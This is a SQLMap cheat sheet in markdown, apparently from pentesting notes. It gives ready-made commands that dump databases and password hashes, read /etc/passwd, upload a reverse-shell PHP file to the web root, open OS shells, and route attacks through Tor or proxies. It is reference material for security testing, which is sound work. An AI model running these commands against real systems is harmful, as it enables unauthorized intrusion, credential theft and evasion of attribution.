# SQLMap



Cheat Sheet Link\
[https://cdn.comparitech.com/wp-content/uploads/2021/07/sqlmap-Cheat-Sheet.pdf](https://cdn.comparitech.com/wp-content/uploads/2021/07/sqlmap-Cheat-Sheet.pdf)



Target: At least one of these options has to be provided to define the target(s)

```
-u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
-d DIRECT           Connection string for direct database connection
-l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
-m BULKFILE         Scan multiple targets given in a textual file
-r REQUESTFILE      Load HTTP request from a file
-g GOOGLEDORK       Process Google dork results as target URLs
-c CONFIGFILE       Load options from a configuration INI filecode
```

```
sqlmap -r req.txt -p namePeople
```

SQLmap Tutorial Enumeration

```
--current-user      Retrieve DBMS current user
--current-db        Retrieve DBMS current database
--hostname          Retrieve DBMS server hostname
--is-dba            Detect if the DBMS current user is DBA
--users             Enumerate DBMS users
--passwords         Enumerate DBMS users password hashes
--privileges        Enumerate DBMS users privileges
```

Dump Everything

```
sqlmap -r req.txt -p namePeople --all
sqlmap -r req.txt -p namePeople --banner
```

Read All Databases

```
sqlmap -r req.txt -p namePeople --dbs
```

Read Current User

```
sqlmap -r req.txt -p namePeople --current-user
sqlmap -r req.txt -p namePeople --roles
```

Read Hostname

```
sqlmap -r req.txt -p namePeople --hostname
```

Read User Privileges

```
sqlmap -r req.txt -p namePeople --privileges
```

SQLmap File System Access - These options can be used to access the back-end database management system underlying file system

```
 --file-read=FILE..  Read a file from the back-end DBMS file system
 --file-write=FIL..  Write a local file on the back-end DBMS file system
 --file-dest=FILE..  Back-end DBMS absolute filepath to write to
```

Read File From Remote System

```
sqlmap -r req.txt -p namePeople --file-read=/etc/passwd --batch
```

Upload File to Remote System

```
sqlmap -r req.txt -p namePeople --file-write=/home/user/rshell.php --file-dest=/var/www/html --batch
```

SQLmap Operating System Access - These options can be used to access the back-end database management system underlying operating system

```
 --os-cmd=OSCMD      Execute an operating system command
 --os-shell          Prompt for an interactive operating system shell
 --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
 --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
 --os-bof            Stored procedure buffer overflow exploitation
 --priv-esc          Database process user privilege escalation
 --msf-path=MSFPATH  Local path where Metasploit Framework is installed
 --tmp-path=TMPPATH  Remote absolute path of temporary files directory
```

```
sqlmap -r req.txt -p namePeople --os-cmd=ifconfig
sqlmap -r req.txt -p namePeople --os-shell
```

SQLmap Windows Registry Access - These options can be used to access the back-end database management system Windows registry

```
--reg-read          Read a Windows registry key value
--reg-add           Write a Windows registry key value data
--reg-del           Delete a Windows registry key value
--reg-key=REGKEY    Windows registry key
--reg-value=REGVAL  Windows registry key value
--reg-data=REGDATA  Windows registry key value data
--reg-type=REGTYPE  Windows registry key value type
```

SQLmap with Anonymity

```
--proxy=PROXY       Use a proxy to connect to the target URL
--proxy-cred=PRO..  Proxy authentication credentials (name:password)
--proxy-file=PRO..  Load proxy list from a file
--proxy-freq=PRO..  Requests between change of proxy from a given list
--tor               Use Tor anonymity network
--tor-port=TORPORT  Set Tor proxy port other than default
--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
--check-tor         Check to see if Tor is used properly
```

SQLmap over Proxy

```
sqlmap --proxy="http://<proxy-ip>:<proxy-port>" 
sqlmap --proxy="http://<proxy-ip>:<proxy-port>" --proxy-cred=username:password
```

SQLmap over TOR

```
sqlmap --tor --tor-port=9050 --tor-type=SOCKS5 -r req.txt --dbs
sqlmap --check-tor

```

{% embed url="https://www.poplabsec.com/complete-sqlmap-tutorial/" %}
